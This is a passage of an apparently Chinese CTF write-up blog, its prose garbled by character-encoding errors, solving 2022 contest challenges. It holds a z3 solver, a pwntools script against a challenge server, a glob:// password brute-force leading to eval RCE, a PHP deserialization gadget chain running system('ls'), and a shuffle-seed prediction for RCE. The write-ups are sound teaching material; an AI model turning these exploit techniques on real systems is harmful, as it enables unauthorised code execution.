<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="EzMath1"><a href="#EzMath1" class="headerlink" title="EzMath1"></a>EzMath1</h3><p>å…ˆè„±upxå£³ï¼Œåœ¨<code>TlsCallback_1</code>å‡½æ•°ä¸­æ‰¾åˆ°ç¨‹åºå®é™…ç”¨äºæ£€æµ‹çš„ä»£ç </p>
<p><img src="/img/wp/2022/2022taizhou-4.png"></p>
<p><code>sub_401210</code>å‡½æ•°æ£€æµ‹è¾“å…¥çš„å‰7ä¸ªå­—ç¬¦</p>
<p><img src="/img/wp/2022/2022taizhou-5.png"></p>
<p><code>sub_401670</code>å‡½æ•°æ£€æµ‹å…¶ä½™è¾“å…¥çš„å­—ç¬¦</p>
<p><img src="/img/wp/2022/2022taizhou-6.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v21=Int(<span class="hljs-string">&#x27;v21&#x27;</span>)<br>v22=Int(<span class="hljs-string">&#x27;v22&#x27;</span>)<br>v23=Int(<span class="hljs-string">&#x27;v23&#x27;</span>)<br>v24=Int(<span class="hljs-string">&#x27;v24&#x27;</span>)<br>v31=Int(<span class="hljs-string">&#x27;v31&#x27;</span>)<br>v32=Int(<span class="hljs-string">&#x27;v32&#x27;</span>)<br>v33=Int(<span class="hljs-string">&#x27;v33&#x27;</span>)<br>s=Solver()<br>s.add(<span class="hljs-number">65</span>*v33+<span class="hljs-number">24</span>*v32+<span class="hljs-number">118</span>*v31+<span class="hljs-number">126</span>*v24+<span class="hljs-number">173</span>*v23+<span class="hljs-number">179</span>*v22+<span class="hljs-number">195</span>*v21==<span class="hljs-number">0xFE5F</span>)<br>s.add(<span class="hljs-number">277</span>*v33+<span class="hljs-number">236</span>*v32+<span class="hljs-number">433</span>*v31+<span class="hljs-number">484</span>*v24+<span class="hljs-number">228</span>*v23+<span class="hljs-number">142</span>*v22+<span class="hljs-number">261</span>*v21==<span class="hljs-number">0x28113</span>)<br>s.add(<span class="hljs-number">496</span>*v33+<span class="hljs-number">309</span>*v32+<span class="hljs-number">46</span>*v31+<span class="hljs-number">135</span>*v24+<span class="hljs-number">165</span>*v23+<span class="hljs-number">7</span>*v22+<span class="hljs-number">495</span>*v21==<span class="hljs-number">152196</span>)<br>s.add(<span class="hljs-number">236</span>*v33+<span class="hljs-number">250</span>*v32+<span class="hljs-number">41</span>*v31+<span class="hljs-number">247</span>*v24+<span class="hljs-number">67</span>*v23+<span class="hljs-number">251</span>*v22+<span class="hljs-number">471</span>*v21==<span class="hljs-number">0x1EFA4</span>)<br>s.add(<span class="hljs-number">457</span>*v33+<span class="hljs-number">414</span>*v32+<span class="hljs-number">271</span>*v31+<span class="hljs-number">32</span>*v24+<span class="hljs-number">244</span>*v23+<span class="hljs-number">74</span>*v22+<span class="hljs-number">113</span>*v21==<span class="hljs-number">0x24273</span>)<br>s.add(<span class="hljs-number">221</span>*v33+<span class="hljs-number">76</span>*v32+<span class="hljs-number">263</span>*v31+<span class="hljs-number">363</span>*v24+<span class="hljs-number">49</span>*v23+<span class="hljs-number">82</span>*v22+<span class="hljs-number">405</span>*v21==<span class="hljs-number">0x1B1AA</span>)<br>s.check()<br>a=<span class="hljs-string">&quot;Yqc77YD8jc&#x27;&#x27;&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br>r=s.model()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[v21 = 71,</span><br><span class="hljs-string"> v22 = 48,</span><br><span class="hljs-string"> v23 = 100,</span><br><span class="hljs-string"> v24 = 77,</span><br><span class="hljs-string"> v31 = 52,</span><br><span class="hljs-string"> v32 = 116,</span><br><span class="hljs-string"> v33 = 104]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r=[<span class="hljs-number">71</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br>    e=e+<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e=e+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)^<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022taizhou-7.png"></p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="reader"><a href="#reader" class="headerlink" title="reader"></a>reader</h3><p>åˆ©ç”¨<code>edit</code>ä¸­çš„åç§» å‘<code>0x4260</code>å¤„å†™å…¥<code>0x200</code>ä¸ªå­—ç¬¦ï¼Œå¯ä»¥è¦†ç›–<code>stream</code>å’Œ<code>filename</code>å˜é‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">off,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendafter(<span class="hljs-string">&#x27;data: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./reader&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;22385&#x27;</span>)<br><span class="hljs-built_in">open</span>()<br>read()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b open&#x27;)</span><br>edit(<span class="hljs-number">0x200</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&quot;./flag\x00&quot;</span>)<br><span class="hljs-built_in">open</span>()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022taizhou-8.png"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="TryGetPasswd"><a href="#TryGetPasswd" class="headerlink" title="TryGetPasswd"></a>TryGetPasswd</h3><p><em>èµ›åå¤ç°</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-comment"># passwd çš„æ ¼å¼ä¸º [a-zA-z0-9]&#123;10&#125;</span><br><span class="hljs-variable">$hintfile</span> = <span class="hljs-string">&quot;/tmp/hint&quot;</span>.<span class="hljs-variable">$passwd</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch <span class="hljs-subst">$hintfile</span>&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">foreach</span> ((<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getSize</span>().<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;passwd&quot;</span>]===<span class="hljs-variable">$passwd</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·å–åˆ°<code>passwd</code>åå¯ä»¥<code>rce</code>ï¼Œè€Œ<code>DirectoryIterator</code>å¯ä»¥åˆ—ç›®å½•ï¼Œå®ƒçš„å‚æ•°æ”¯æŒ<code>glob://</code>ä¼ªåè®®ï¼Œå½“å­˜åœ¨æ–‡ä»¶æ—¶<code>$file-&gt;getSize()æœ‰å›æ˜¾</code>å›æ˜¾ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡è„šæœ¬éå†è·å–åˆ°<code>passwd</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&amp;dir=glob:///tmp/hint&quot;</span><br>b=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> b:<br>        r=requests.get(url+data+j+<span class="hljs-string">&#x27;*&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            data=data+j<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure>


<p><img src="/img/wp/2022/2022taizhou-9.png"></p>
<p>æ‹¿åˆ°passwdï¼š<code>st1sOFAblF</code>ï¼Œè¿›è¡Œrce</p>
<p><img src="/img/wp/2022/2022taizhou-10.png"></p>
<h3 id="ezGadget01"><a href="#ezGadget01" class="headerlink" title="ezGadget01"></a>ezGadget01</h3><p><em>èµ›åå¤ç°</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;exit&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = False;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;judge)<br>        &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;, &quot;</span>, <span class="hljs-variable">$arguments</span>));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My name is &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-number">5</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;num &gt; <span class="hljs-number">10</span>)<br>        &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chain</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;param))<br>        &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;param-&gt;arg;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨<code>Junit</code>ç±»ä¸­å­˜åœ¨<code>e</code>æ–¹æ³•ä¼šæ‰§è¡Œ<code>eval</code>å‡½æ•°<br>å¯ä»¥åˆ©ç”¨<code>CallFunction</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•è°ƒç”¨<code>Junit</code>ç±»ä¸­<code>e</code>æ–¹æ³•<br>åˆ©ç”¨<code>GetName</code>ç±»ä¸­çš„<code>__get</code>æ–¹æ³•è§¦å‘<code>CallFunction</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•<br>åˆ©ç”¨<code>Proc01</code>ç±»ä¸­çš„<code>__toString</code>æ–¹æ³•è§¦å‘<code>GetName</code>ç±»ä¸­çš„<code>__get</code>æ–¹æ³•<br>åˆ©ç”¨<code>Space</code>ç±»ä¸­çš„<code>__wakeup</code>æ–¹æ³•è§¦å‘<code>Proc01</code>ç±»ä¸­çš„<code>__toString</code>æ–¹æ³•</p>
<p>è°ƒç”¨é¡ºåº:<code>Space-&gt;Proc01-&gt;GetName-&gt;CallFunction-&gt;Junit</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = True;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num=<span class="hljs-number">20</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=[<span class="hljs-keyword">new</span> <span class="hljs-title class_">Junit</span>(),<span class="hljs-string">&quot;e&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallFunction</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;args=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;param=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetName</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proc01</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Space</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022taizhou-11.png"></p>
<h1 id="å†³èµ›"><a href="#å†³èµ›" class="headerlink" title="å†³èµ›"></a>å†³èµ›</h1><p>ç–«æƒ…åŸå› çº¿ä¸Šawdã€‚Rank: 2</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>wp</tag>
        <tag>å°å·</tag>
        <tag>2022</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äº”å±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›-WP</title>
    <url>/posts/780baaa1/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]](<span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]]);<br></code></pre></td></tr></table></figure>

<p>å› ä¸º<code>shuffle</code>å‡½æ•°ä½¿ç”¨ä¼ªéšæœºæ•°äº§ç”Ÿå™¨ï¼Œæ‰€ä»¥å½“æ—¶é—´æˆ³ç›¸åŒæ—¶ï¼Œä¸¤ä¸ªç›¸åŒæ•°ç»„æ‰“ä¹±åäº§ç”Ÿçš„ä¸¤ä¸ªæ–°æ•°ç»„ä¹Ÿç›¸åŒ</p>
<p>åœ¨æœ¬åœ°ç¼–å†™phpä»£ç ï¼Œè·å–ç´¢å¼•å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10003</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;system&#x27;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;system:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;cmd:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å°†æœ¬åœ°è·å–åˆ°çš„ç´¢å¼•å€¼ä¼ å…¥é¶æœºï¼ŒæˆåŠŸrce</p>
